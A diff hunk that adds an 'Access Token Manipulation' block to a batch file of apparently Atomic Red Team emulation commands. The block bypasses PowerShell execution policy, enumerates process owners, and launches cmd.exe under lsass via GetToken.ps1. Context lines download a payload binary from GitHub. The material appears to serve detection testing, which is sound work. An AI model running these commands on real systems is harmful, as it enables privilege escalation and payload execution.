@@ -197,5 +197,21 @@ powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-re
 
 powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin' -OutFile '%payload_file%' -UseBasicParsing"
 
+****
+
+Access Token Manipulation
+
+@echo off
+
+rem Set Execution Policy to Bypass for the current process
+powershell -Command "Set-ExecutionPolicy -Scope Process Bypass -Force"
+
+rem Get process owners
+powershell -Command "$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l='Owner';e={$owners[$_.id.tostring()]}}"
+
+rem Run GetToken.ps1 and create a process from lsass
+powershell -Command "& '%PathToAtomicsFolder%\T1134.002\src\GetToken.ps1'; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,'cmd.exe')"
+
+
 
 
